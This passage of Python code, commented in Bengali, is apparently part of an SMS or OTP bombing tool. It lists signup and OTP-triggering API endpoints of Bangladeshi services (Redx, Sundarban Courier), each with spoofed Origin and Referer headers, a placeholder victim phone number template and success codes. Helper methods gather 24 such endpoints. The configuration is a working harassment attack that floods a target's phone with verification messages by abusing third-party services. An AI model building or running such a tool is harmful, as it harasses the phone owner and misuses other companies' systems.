            "email_required": True,
            "success_codes": [200, 201]
        },
        {
            "name": "Redx",
            "url": "https://api.redx.com.bd/v1/user/signup",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": "https://redx.com.bd",
                "Referer": "https://redx.com.bd/"
            },
            "data": {
                "name": "Mainul",
                "phoneNumber": "0{number}",
                "service": "redx"
            },
            "data_type": "json",
            "number_format": "0 দিয়ে, 10 digits",
            "name_required": True,
            "success_code": 200
        },
        {
            "name": "Sundarban Courier",
            "url": "https://api-gateway.sundarbancourierltd.com/graphql",
            "method": "POST",
            "headers_template": {
                "Content-Type": "application/json",
                "Origin": "https://customer.sundarbancourierltd.com",
                "x-requested-with": "mark.via.gp"
            },
            "graphql": True,
            "operation": "CreateAccessToken",
            "variables": {
                "accessTokenFilter": {
                    "userName": "0{number}"
                }
            },
            "query": """
            mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {
              createAccessToken(accessTokenFilter: $accessTokenFilter) {
                message
                statusCode
                result {
                  phone
                  otpCounter
                  __typename
                }
                __typename
              }
            }
            """,
            "number_format": "0 দিয়ে, 10 digits",
            "success_code": 200
        }
    ]

    # ==================== সব API একসাথে ====================
    @classmethod
    def get_all(cls):
        """সকল API রিটার্ন করবে (২৪ টি)"""
        all_apis = []
        all_apis.extend(cls.STREAMING)
        all_apis.extend(cls.TELECOM)
        all_apis.extend(cls.ECOMMERCE)
        all_apis.extend(cls.COURIER)
        return all_apis
    
    @classmethod
    def get_stats(cls):
        """API পরিসংখ্যান"""
        return {
            "total": len(cls.get_all()),
            "streaming": len(cls.STREAMING),
            "telecom": len(cls.TELECOM),
            "ecommerce": len(cls.ECOMMERCE),
            "courier": len(cls.COURIER)
        }